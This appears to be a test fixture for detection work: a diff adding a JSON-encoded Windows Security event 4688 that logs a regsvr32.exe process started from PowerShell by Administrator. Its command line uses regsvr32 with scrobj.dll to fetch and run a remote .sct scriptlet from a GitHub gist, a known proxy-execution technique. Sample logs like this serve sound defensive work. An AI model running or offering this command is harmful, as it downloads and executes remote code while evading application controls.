@@ -1,0 +1,93 @@
+{
+    "Event": {
+        "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event",
+        "System": {
+            "Provider": {
+                "Name": "Microsoft-Windows-Security-Auditing",
+                "Guid": "{54849625-5478-4994-a5ba-3e3b0328c30d}"
+            },
+            "EventID": "4688",
+            "Version": "2",
+            "Level": "0",
+            "Task": "13312",
+            "Opcode": "0",
+            "Keywords": "0x8020000000000000",
+            "TimeCreated": {
+                "SystemTime": "2023-06-29T00:13:02.246677400Z"
+            },
+            "EventRecordID": "51378042",
+            "Correlation": null,
+            "Execution": {
+                "ProcessID": "4",
+                "ThreadID": "6844"
+            },
+            "Channel": "Security",
+            "Computer": "pc.domain.com",
+            "Security": null
+        },
+        "EventData": {
+            "Data": [
+                {
+                    "text": "S-1-5-21-936165926-1453112849-1990505774-500",
+                    "Name": "SubjectUserSid"
+                },
+                {
+                    "text": "Administrator",
+                    "Name": "SubjectUserName"
+                },
+                {
+                    "text": "domain",
+                    "Name": "SubjectDomainName"
+                },
+                {
+                    "text": "0xa3156e2",
+                    "Name": "SubjectLogonId"
+                },
+                {
+                    "text": "0x165c",
+                    "Name": "NewProcessId"
+                },
+                {
+                    "text": "C:\\Windows\\System32\\regsvr32.exe",
+                    "Name": "NewProcessName"
+                },
+                {
+                    "text": "%%1936",
+                    "Name": "TokenElevationType"
+                },
+                {
+                    "text": "0x7f8",
+                    "Name": "ProcessId"
+                },
+                {
+                    "text": "\"C:\\Windows\\system32\\regsvr32.exe\" /i:https://gist.githubusercontent.com/bohops/72031fecb0f58531753f51d4ef2b86e9/raw/805dcca541e6b5efa1420e8758eaea9c3487dcf0/notepad.sct scrobj.dll",
+                    "Name": "CommandLine"
+                },
+                {
+                    "text": "S-1-0-0",
+                    "Name": "TargetUserSid"
+                },
+                {
+                    "text": "-",
+                    "Name": "TargetUserName"
+                },
+                {
+                    "text": "-",
+                    "Name": "TargetDomainName"
+                },
+                {
+                    "text": "0x0",
+                    "Name": "TargetLogonId"
+                },
+                {
+                    "text": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+                    "Name": "ParentProcessName"
+                },
+                {
+                    "text": "S-1-16-12288",
+                    "Name": "MandatoryLabel"
+                }
+            ]
+        }
+    }
+}
